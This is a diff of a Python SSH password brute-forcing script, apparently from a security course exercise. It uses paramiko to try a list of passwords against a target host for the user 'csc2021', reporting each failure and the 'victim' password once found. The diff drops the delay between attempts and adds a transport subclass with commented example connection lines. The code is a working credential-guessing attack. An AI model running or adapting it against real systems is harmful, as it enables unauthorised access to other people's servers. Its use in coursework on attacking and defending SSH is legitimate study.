@@ -9,7 +9,20 @@ victim_passwd = ""
 index = 0
 thread_idx_list = []
 lock = threading.Lock()
-THREAD_NUMBER = 128
+THREAD_NUMBER = 1
+
+
+class FastTransport(paramiko.Transport):
+    def __init__(self, sock):
+        super(FastTransport, self).__init__(sock)
+        self.window_size = 2147483647
+        self.packetizer.REKEY_BYTES = pow(2, 40)
+        self.packetizer.REKEY_PACKETS = pow(2, 40)
+
+
+# ssh_conn = FastTransport(('host.example.com', 22))
+# ssh_conn.connect(username='username', password='password')
+# sftp = paramiko.SFTPClient.from_transport(ssh_conn)
 
 def init_thread_idx(MAX_NUM):
     global thread_idx_list
@@ -31,21 +44,22 @@ def job(passwd_list, maxlength, thread_idx):
         if(idx >= maxlength):
             break
 
-        trans = paramiko.Transport((sys.argv[1],  22))
-        trans.banner_timeout = 30
+        s = paramiko.SSHClient()
+        s.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
         try:
-            trans.connect(username="csc2021",  password=passwd_list[idx])
+            s.connect(sys.argv[1], username="csc2021",
+                      password=passwd_list[idx], banner_timeout=300)
         except paramiko.SSHException:
-            trans.close()
+            s.close()
             print("password: %-40s is UNsuccessful, index: %d" % (passwd_list[idx], idx))
         except paramiko.AuthenticationException:
-            trans.close()
+            s.close()
             print("password: %-40s is UNsuccessful, index: %d" % (passwd_list[idx], idx))
         else:
             print("Successful 🤖️🤖️🤖️ ! password is : %s" %
                   passwd_list[idx])
             victim_passwd = passwd_list[idx]
-        time.sleep(0.5)
 
 class dictionary():
     
